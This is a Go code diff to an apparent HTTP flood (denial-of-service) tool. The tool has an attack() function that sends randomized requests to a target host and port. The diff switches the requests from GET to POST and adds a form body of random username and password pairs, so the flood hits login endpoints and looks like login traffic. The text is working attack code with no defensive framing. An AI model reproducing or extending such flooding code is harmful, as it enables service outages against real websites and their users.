@@ -18,6 +18,16 @@ var (
 	path      = "/"
 	timer     = 0
 	rpath     = false
+	// List of names
+	names = []string{
+		"Aaren", "Aarika", "Abagael", "Abagail", "Abbe", "Abbey", "Abbi", "Abbie", "Abby", "Abbye",
+		"Abigael", "Abigail", "Abigale", "Abra", "Ada", "Adah", "Adaline", "Adan", "Adara", "Adda",
+		"Addi", "Addia", "Addie", "Addy", "Adel", "Adela", "Adelaida", "Adelaide", "Adele", "Adelheid"}
+
+	password = []string{
+		"Aaren", "Aarika", "Abagael", "Abagail", "Abbe", "Abbey", "Abbi", "Abbie", "Abby", "Abbye",
+		"Abigael", "Abigail", "Abigale", "Abra", "Ada", "Adah", "Adaline", "Adan", "Adara", "Adda",
+		"Addi", "Addia", "Addie", "Addy", "Adel", "Adela", "Adelaida", "Adelaide", "Adele", "Adelheid"}
 	a_z       = []string{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"}
 	acceptall = []string{
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
@@ -92,7 +102,9 @@ func getheader() string {
 	accept := acceptall[rand.Intn(len(acceptall))]
 	referer := "Referer: " + "https://" + ip + "/" + "\r\n"
 	useragent := "User-Agent: " + getuseragent() + "\r\n"
-	header := useragent + connection + accept + referer + "\r\n"
+	payload := fmt.Sprintf("username=%s&password=%s\r\n", names[rand.Intn(len(names))], password[rand.Intn(len(names))])
+	content := "Content-Type: application/x-www-form-urlencoded\r\nContent-Length:" + strconv.Itoa(len(payload)) + "\r\n"
+	header := useragent + connection + accept + referer + content + "\r\n" + payload
 	return header
 }
 
@@ -103,7 +115,7 @@ func attack() {
 		if rpath == true {
 			path = "/" + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + ".php"
 		}
-		get_host := "GET " + path + " HTTP/1.1\r\nHost: " + ip + ":" + strconv.Itoa(port) + "\r\n"
+		get_host := "POST " + path + " HTTP/1.1\r\nHost: " + ip + ":" + strconv.Itoa(port) + "\r\n"
 		request := get_host + header
 		addr := ip + ":" + strconv.Itoa(port)
 		if port == 443 {
